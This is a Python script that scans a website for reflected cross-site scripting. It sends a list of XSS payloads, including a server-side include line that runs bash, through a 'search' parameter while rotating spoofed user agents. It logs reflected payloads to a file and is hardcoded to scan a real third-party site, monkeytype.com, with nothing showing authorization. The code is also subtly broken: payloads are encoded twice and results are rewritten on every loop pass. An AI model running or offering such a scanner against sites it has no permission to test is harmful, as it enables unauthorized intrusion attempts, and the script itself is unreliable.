import urllib.parse
import requests
from requests.exceptions import RequestException
import threading
import string
import random
import logging
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)
LOG_FORMAT = f"{Fore.BLUE}[%(asctime)s]{Style.RESET_ALL} %(levelname)s: %(message)s"

logging.basicConfig(
    level=logging.DEBUG,
    format=LOG_FORMAT
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Android 11; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.69",
    "Mozilla/5.0 (Linux; U; Android 10; en-us; SM-N960U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 12.3; en-US; rv:90.0) Gecko/20100101 Firefox/90.0"
]

PAYLOADS = [
    '<script>alert("XSS Attack")</script>',
    '<img src="x" onerror="alert(\'XSS Attack\')">',
    '<a href="javascript:alert(\'XSS Attack\')">Click Here</a>',
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input type='text' value='XSS' onfocus='alert(\"XSS\");'>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>XSS Test</marquee>",
    "<table background='javascript:alert(\"XSS\")'>",
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<img src=x onerror=prompt('XSS')>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<audio src='javascript:alert(\"XSS\")'></audio>",
    "<video src='javascript:alert(\"XSS\")'></video>",
    "<div style=width:expression(alert('XSS'))>XSS</div>",
    "'><script>alert(\"XSS\")</script>",
    "'\"><img src=x onerror=alert(\"XSS\")>",
    "`<script>alert(\"XSS\")</script>`",
    "<!--#exec cmd=\"/bin/bash -c 'echo XSS'\"-->",
    "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"  
]

def user_agent():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def check_website(url):
    try:
        response = requests.get(url, headers=user_agent())

        if response.status_code == 200:
            logging.info(f"{Fore.GREEN}[+] Website is reachable: {url}{Style.RESET_ALL}")
            return True
        
        elif response.status_code in [400, 403, 404]:
            logging.warning(f"{Fore.YELLOW}[!] Client-side issue detected ({response.status_code}): {url}{Style.RESET_ALL}")
        elif response.status_code >= 500:
            logging.error(f"{Fore.RED}[X] Server error ({response.status_code}): {url}{Style.RESET_ALL}")

    except RequestException as e:
        logging.error(f"{Fore.RED}[X] Failed to connect to {url}: {e}{Style.RESET_ALL}")
    
    return False

def check_xss(url):

    if not check_website(url):
        return
    vulnerable = []

    for payload in PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)

        try:
            response = requests.get(url, params={'search': encoded_payload}, headers=user_agent(), timeout=10)

            if payload in response.text:
                logging.info(f"{Fore.GREEN}[+] XSS Vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
                vulnerable.append(payload)
        
        except RequestException as e:
            logging.error(f"{Fore.RED}[!] Error during XSS check on {url}: {e}{Style.RESET_ALL}")

        if vulnerable:
            with open("xss_results.txt", "a") as file:
                file.write(f"Vulnerable URL: {url}\n")
                file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
            logging.info(f"{Fore.GREEN}[+] Results saved to xss_results.txt{Style.RESET_ALL}")

check_xss("https://monkeytype.com/")




